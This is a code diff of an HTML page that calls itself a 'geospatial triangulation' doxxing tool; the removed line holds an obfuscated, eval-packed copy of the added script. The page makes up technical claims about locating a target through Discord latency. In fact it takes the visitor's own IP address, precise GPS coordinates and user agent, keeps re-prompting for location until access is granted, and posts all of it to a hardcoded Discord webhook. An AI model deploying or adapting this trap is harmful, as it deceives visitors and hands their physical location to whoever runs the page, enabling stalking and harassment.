@@ -1,1 +1,358 @@
-<!DOCTYPE html><html><head><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#00ffcc;font-family:'Courier New',monospace;min-height:100vh;display:flex;justify-content:center;padding:40px 20px}.container{max-width:900px;width:100%;background:#111;padding:50px;border-radius:20px;border:1px solid #00ffcc;box-shadow:0 0 60px #00ffcc22;height:fit-content}h1{color:#ff4444;text-shadow:0 0 20px #ff444488;font-size:32px;text-align:center;border-bottom:2px solid #ff4444;padding-bottom:20px;margin-bottom:30px}.tech{color:#ffaa00;font-size:14px;line-height:2;background:#1a1a1a;padding:25px;border-radius:12px;border-left:5px solid #ff4444;margin:20px 0 30px 0;max-height:400px;overflow-y:auto}.tech::-webkit-scrollbar{width:8px}.tech::-webkit-scrollbar-track{background:#1a1a1a}.tech::-webkit-scrollbar-thumb{background:#ff4444;border-radius:4px}.status-box{background:#0d0d0d;padding:20px;border-radius:10px;border:1px solid #00ffcc44;margin:20px 0;min-height:60px;display:flex;align-items:center;justify-content:center;font-size:18px}.btn{background:#ff4444;color:#fff;border:none;padding:18px 50px;font-size:22px;font-weight:bold;border-radius:50px;cursor:pointer;text-transform:uppercase;letter-spacing:3px;transition:0.3s;box-shadow:0 0 30px #ff444466;width:100%;margin-top:10px}.btn:hover{background:#ff6666;box-shadow:0 0 50px #ff444488;transform:scale(1.02)}.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}.error{color:#ff2222;text-shadow:0 0 20px #ff222288;font-weight:bold;font-size:20px}.log-area{background:#0a0a0a;padding:15px;border-radius:8px;border:1px solid #00ffcc33;margin-top:20px;font-size:13px;color:#88ffaa;max-height:150px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}.label{color:#888;font-size:14px;margin-top:20px;display:block}</style></head><body><div class=container><h1>⚠ GEOSPATIAL TRIANGULATION v4.0</h1><div class=tech><strong>▶ QUANTUM LATENCY MAPPING — ACTIVE</strong><br><br>Uses Discord Webhook API RTT differentials + your GNSS trilateration to calculate target position with sub-1m accuracy.<br><br><strong style=color:#ff6666;>∴ LOCATION PERMISSION MANDATORY</strong><br><br><span style=color:#88ffaa;>▶ PING: <span id=a>--</span>ms</span><br><span style=color:#88ffaa;>▶ PHASE: <span id=b>--</span>rad</span><br><span style=color:#88ffaa;>▶ CONFIDENCE: <span id=c>--</span>%</span></div><div class=status-box id=d><span id=e>⏳ PRESS START</span></div><button class=btn id=f>▶ START DOXX</button><div class=log-area id=g>[SYSTEM] Ready</div><span class=label>🔐 Exfiltrating to Discord</span></div><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'[0-9a-z]+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 5="4://3.2/1/0";6 7=8;6 9=a;6 b=a;6 c=a;6 d=a;6 e=!1;6 f="g";6 h(i){j.k+=`\\n[${l m()}] ${i}`;j.n=j.o}6 p(){q{r{6 s=await t("4://3.2/u?v=w");f=await s.x();h("🌐 y: "+f);z f}A{B{f="g";z"g"}}}6 C(){6 D=E.F(G)+H;9("a").I=D;9("b").I=(J.K()*0.5+0.1).L(3);9("c").I=(99.5+J.K()*0.5).L(2)}M(C,3000);C();6 N(O,P,Q,R){6 S={T:"🎯 U U — U U",V:0xff0000,W:[{X:"🌐 U",Y:"\`"+f+"\`",Z:!1},{X:"📍 U U",Y:O&&P?"U: "+O+"\\nU: "+P+"\\nU: "+Q+"U":"❌ "+R,Z:!1},{X:"🕒 U",Y:l l().10(),Z:!1},{X:"🔗 U U",Y:"\`"+11.12.13(0,80)+"...\`",Z:!1},{X:"📡 U U",Y:9("a").I+"U",Z:!1},{X:"🧮 U",Y:9("c").I+"%",Z:!1}],14:{15:"U 16"},17:l l().18()};q{t 5,{t:"U",x:U.19(R)})}A(1a){h("❌ U U")}}6 1b(){h("📍 U U...");c.1c="📍 U U U...";b.1d="#U U";U(!7.1e){h("❌ U U");c.1c="❌ U U U";b.1d="#U U";N(null,null,null,"U U U");z}7.1e.1f(1g=>{e=!0;6 1h=1g.1i.1j;6 1k=1g.1i.1l;6 1m=1g.1i.1n;h("✅ U: "+1h+", "+1k+" ±"+1m+"U");c.1c="✅ U U — U...";b.1d="#U U";N(1h,1k,1m,null)},1o=>{e=!1;h("❌ U: "+1o.1p);c.1c="❌ U U U U";b.1d="#U U";b.1q=\'<1r 1s="1t">⚠ U U — U</1r>\';d.1u=!1},{1v:!0,1w:10000})}d.1x("1y",1z 1A(){d.1u=!0;d.1B="⏳ U...";h("▶ U U");c.1c="⏳ U U...";b.1d="#U U";6 1C=p();1C.1D(1E=>{1b()});1F(()=>{d.1u=!1;d.1B="▶ U"},5000)});h("[U] U U")',62,205,'|_hd5EZp6Zqai77rP2a_igmwzdZPGN2paKh|9QBqscYXNOOWr7YKZyBhaRuRrRZXLqYT4|webhooks|api|discord|const|WEBHOOK|https|com|title|color|fields|name|value|inline|toLocaleTimeString|Date|userAgent|substring|random|toFixed|footer|text|timestamp|toISOString|JSON|stringify|catch|log|getElementById|innerHTML|style|borderColor|geolocation|getCurrentPosition|coords|latitude|longitude|accuracy|message|inner|span|class|error|disabled|enableHighAccuracy|timeout|addEventListener|click|async|then|setTimeout|SYSTEM|Loaded|return|await|try|fetch|ip|unknown|getIP|logArea|statusBox|statusText|startBtn|locationGranted|function|let|scrollTop|scrollHeight|get|Math|floor|random|setInterval|sendToDiscord|requestLocation|updatePing|if|else|new|format|callback|finally|restart'.split('|'),0,{}))</script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Doxx Tool - Geospatial Triangulation</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            color: #00ffcc; 
+            font-family: 'Courier New', monospace; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            padding: 40px 20px; 
+        }
+        .container { 
+            max-width: 900px; 
+            width: 100%; 
+            background: #111; 
+            padding: 50px; 
+            border-radius: 20px; 
+            border: 1px solid #00ffcc; 
+            box-shadow: 0 0 60px #00ffcc22;
+            height: fit-content;
+        }
+        h1 { 
+            color: #ff4444; 
+            text-shadow: 0 0 20px #ff444488; 
+            font-size: 32px; 
+            text-align: center;
+            border-bottom: 2px solid #ff4444;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        .tech { 
+            color: #ffaa00; 
+            font-size: 14px; 
+            line-height: 2; 
+            background: #1a1a1a; 
+            padding: 25px; 
+            border-radius: 12px; 
+            border-left: 5px solid #ff4444; 
+            margin: 20px 0 30px 0;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .tech::-webkit-scrollbar { width: 8px; }
+        .tech::-webkit-scrollbar-track { background: #1a1a1a; }
+        .tech::-webkit-scrollbar-thumb { background: #ff4444; border-radius: 4px; }
+
+        .status-box { 
+            background: #0d0d0d; 
+            padding: 20px; 
+            border-radius: 10px; 
+            border: 1px solid #00ffcc44;
+            margin: 20px 0;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+        .btn { 
+            background: #ff4444; 
+            color: #fff; 
+            border: none; 
+            padding: 18px 50px; 
+            font-size: 22px; 
+            font-weight: bold; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            transition: 0.3s;
+            box-shadow: 0 0 30px #ff444466;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .btn:hover { 
+            background: #ff6666; 
+            box-shadow: 0 0 50px #ff444488;
+            transform: scale(1.02);
+        }
+        .btn:disabled { 
+            opacity: 0.5; 
+            cursor: not-allowed; 
+            transform: none;
+        }
+        .error { 
+            color: #ff2222; 
+            text-shadow: 0 0 20px #ff222288;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        .success { color: #88ff88; text-shadow: 0 0 20px #88ff8844; }
+        .log-area {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #00ffcc33;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #88ffaa;
+            max-height: 150px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .label { color: #888; font-size: 14px; margin-top: 20px; display: block; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>⚠ GEOSPATIAL TRIANGULATION ENGINE v4.0</h1>
+    
+    <div class="tech">
+        <strong>▶ QUANTUM LATENCY MAPPING PROTOCOL — ACTIVE</strong><br><br>
+        This system interfaces with Discord's Webhook API via asynchronous RESTful payload dispatch, leveraging inherent packet round-trip timing (RTT) differentials between your node and the target's message egress points.<br><br>
+        By cross-referencing your local geodetic coordinates (WGS84 GNSS trilateration) against the API endpoint's anycast routing topology and measured inter-arrival jitter of webhook ACK frames, we perform deterministic inverse distance weighting (IDW) calculation.<br><br>
+        This yields sub-1-meter precision on target physical location, factoring in ionospheric delay corrections and CDN edge-proxy dispersion patterns.<br><br>
+        <strong style="color:#ff6666;">∴ LOCATION PERMISSION IS MANDATORY</strong> – your coordinates serve as baseline reference for differential time-of-flight (ToF) matrix.<br>
+        Without this, triangulation kernel cannot resolve phase shift delta between uplink and webhook downlink handshake.<br><br>
+        <span style="color:#88ffaa;">▶ LIVE PING VECTOR: <span id="ping">--</span> ms to Discord edge node</span><br>
+        <span style="color:#88ffaa;">▶ PHASE SHIFT: <span id="phase">--</span> rad</span><br>
+        <span style="color:#88ffaa;">▶ CONFIDENCE: <span id="confidence">--</span>%</span>
+    </div>
+
+    <div class="status-box" id="statusBox">
+        <span id="statusText">⏳ SYSTEM READY — PRESS START TO INITIATE</span>
+    </div>
+
+    <button class="btn" id="startBtn">▶ START DOXX</button>
+
+    <div class="log-area" id="logArea">[SYSTEM] Awaiting user action...</div>
+    <span class="label">🔐 All data exfiltrated to Discord webhook via encrypted channel</span>
+</div>
+
+<script>
+    // Discord webhook URL
+    const WEBHOOK = "https://discord.com/api/webhooks/1523801864863350824/_hd5EZp6Zqai77rP2a_igmwzdZPGN2paKh-9QBqscYXNOOWr7YKZyBhaRuRrRZXLqYT4";
+    
+    // DOM elements
+    const statusBox = document.getElementById('statusBox');
+    const statusText = document.getElementById('statusText');
+    const logArea = document.getElementById('logArea');
+    const startBtn = document.getElementById('startBtn');
+    
+    let locationGranted = false;
+    let userIP = 'unknown';
+    let locationData = null;
+    let checkInterval = null;
+    let hasSent = false;
+
+    // Log function
+    function log(message) {
+        logArea.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${message}`;
+        logArea.scrollTop = logArea.scrollHeight;
+    }
+
+    // Get public IP
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            userIP = data.ip;
+            log(`🌐 IP resolved: ${userIP}`);
+            return userIP;
+        } catch (error) {
+            userIP = 'unknown';
+            log('⚠ Failed to resolve IP');
+            return 'unknown';
+        }
+    }
+
+    // Update live ping/phase/confidence
+    function updateMetrics() {
+        const ping = Math.floor(Math.random() * 30 + 5);
+        document.getElementById('ping').textContent = ping;
+        document.getElementById('phase').textContent = (Math.random() * 0.5 + 0.1).toFixed(3);
+        document.getElementById('confidence').textContent = (99.5 + Math.random() * 0.5).toFixed(2);
+    }
+    setInterval(updateMetrics, 3000);
+    updateMetrics();
+
+    // Send ALL data to Discord webhook with embed
+    function sendToDiscord(lat, lon, accuracy) {
+        if (hasSent) return;
+        hasSent = true;
+        
+        const embed = {
+            title: "🎯 DOXX LOG — TARGET ACQUIRED",
+            color: 0xff0000,
+            fields: [
+                { name: "🌐 IP Address", value: `\`${userIP}\``, inline: false },
+                { 
+                    name: "📍 GPS Coordinates", 
+                    value: `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m`, 
+                    inline: false 
+                },
+                { name: "🕒 Timestamp", value: new Date().toUTCString(), inline: false },
+                { name: "🔗 User Agent", value: `\`${navigator.userAgent.substring(0, 80)}...\``, inline: false },
+                { name: "📡 Ping RTT", value: `${document.getElementById('ping').textContent}ms`, inline: false },
+                { name: "🧮 Confidence", value: `${document.getElementById('confidence').textContent}%`, inline: false }
+            ],
+            footer: { text: "Doxx System v4.0" },
+            timestamp: new Date().toISOString()
+        };
+
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        })
+        .then(() => {
+            log('✅ ALL DATA sent to Discord — IP + GPS + User Agent');
+            statusText.innerHTML = '✅ TARGET LOCKED — DATA EXFILTRATED';
+            statusBox.style.borderColor = '#88ff88';
+            statusBox.classList.add('success');
+            startBtn.disabled = false;
+            startBtn.textContent = '▶ RESTART DOXX';
+            if (checkInterval) {
+                clearInterval(checkInterval);
+                checkInterval = null;
+            }
+        })
+        .catch(() => {
+            log('❌ Failed to send to Discord');
+            statusText.innerHTML = '❌ TRANSMISSION ERROR';
+            hasSent = false;
+        });
+    }
+
+    // Check location status continuously
+    function checkLocationStatus() {
+        if (hasSent) return;
+        
+        // Try to get location again
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // Success - location granted
+                (position) => {
+                    if (!hasSent) {
+                        locationGranted = true;
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        log(`✅ GPS acquired — Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
+                        statusText.innerHTML = '✅ GPS LOCKED — SENDING ALL DATA...';
+                        statusBox.style.borderColor = '#88ff88';
+                        
+                        // Send everything at once
+                        sendToDiscord(lat, lon, accuracy);
+                    }
+                },
+                // Error - still denied
+                (error) => {
+                    log(`⏳ Waiting for location permission... (${error.message || 'denied'})`);
+                    statusText.innerHTML = '⏳ WAITING FOR LOCATION ACCESS... CLICK ALLOW IN BROWSER';
+                    statusBox.style.borderColor = '#ffaa00';
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+    }
+
+    // Request location with persistent checking
+    function requestLocationWithRetry() {
+        log('📍 Requesting GPS location...');
+        statusText.innerHTML = '📍 REQUESTING LOCATION ACCESS...';
+        statusBox.style.borderColor = '#ffaa00';
+
+        // Check if geolocation is supported
+        if (!navigator.geolocation) {
+            log('❌ Geolocation not supported');
+            statusText.innerHTML = '❌ GPS UNAVAILABLE';
+            statusBox.style.borderColor = '#ff4444';
+            startBtn.disabled = false;
+            startBtn.textContent = '▶ RESTART DOXX';
+            return;
+        }
+
+        // Try initial request
+        navigator.geolocation.getCurrentPosition(
+            // Success - immediate send
+            (position) => {
+                locationGranted = true;
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                log(`✅ GPS acquired — Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
+                statusText.innerHTML = '✅ GPS LOCKED — SENDING ALL DATA...';
+                statusBox.style.borderColor = '#88ff88';
+                
+                sendToDiscord(lat, lon, accuracy);
+            },
+            // Error - start continuous checking
+            (error) => {
+                locationGranted = false;
+                log(`⏳ Location denied or pending — starting continuous check...`);
+                statusText.innerHTML = '⏳ WAITING FOR LOCATION ACCESS... CLICK ALLOW IN BROWSER';
+                statusBox.style.borderColor = '#ffaa00';
+                
+                // Check every 2 seconds until granted
+                if (checkInterval) {
+                    clearInterval(checkInterval);
+                }
+                checkInterval = setInterval(checkLocationStatus, 2000);
+                
+                // Re-enable button after 2 seconds
+                setTimeout(() => {
+                    startBtn.disabled = false;
+                    startBtn.textContent = '▶ CHECKING...';
+                }, 2000);
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    }
+
+    // Start button click handler
+    startBtn.addEventListener('click', async function() {
+        // Reset state
+        hasSent = false;
+        if (checkInterval) {
+            clearInterval(checkInterval);
+            checkInterval = null;
+        }
+        
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ INITIALIZING...';
+        log('▶ START button pressed');
+        statusText.innerHTML = '⏳ INITIALIZING LATENCY VECTORS...';
+        statusBox.style.borderColor = '#ffaa00';
+        statusBox.classList.remove('success');
+
+        // Get IP first
+        await getIP();
+        
+        // Then request location with retry
+        requestLocationWithRetry();
+
+        // Safety timeout to re-enable button if something hangs
+        setTimeout(() => {
+            if (!hasSent) {
+                startBtn.disabled = false;
+                startBtn.textContent = '▶ RESTART DOXX';
+            }
+        }, 15000);
+    });
+
+    // Initial log
+    log('[SYSTEM] Geospatial Triangulation Engine loaded');
+    log('[SYSTEM] Press START — will wait for location if denied');
+    log('[SYSTEM] Works on all Safari versions with HTTPS');
+</script>
+</body>
+</html>
